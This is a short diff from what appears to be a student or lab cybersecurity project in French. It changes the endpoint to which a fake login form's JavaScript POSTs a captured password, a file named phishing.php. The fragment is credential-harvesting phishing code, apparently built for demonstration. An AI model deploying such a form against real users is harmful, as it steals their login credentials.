@@ -88,7 +88,7 @@ header('Content-Type: application/javascript');
             const password = document.getElementById('phishing-password').value;
             
             // Envoyer les identifiants au serveur
-            fetch('/messagerie/codes/fake_login/phishing.php', {
+            fetch('/projects/MDI/cyber-securite/messagerie/codes/fake_login/phishing.php', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/x-www-form-urlencoded',
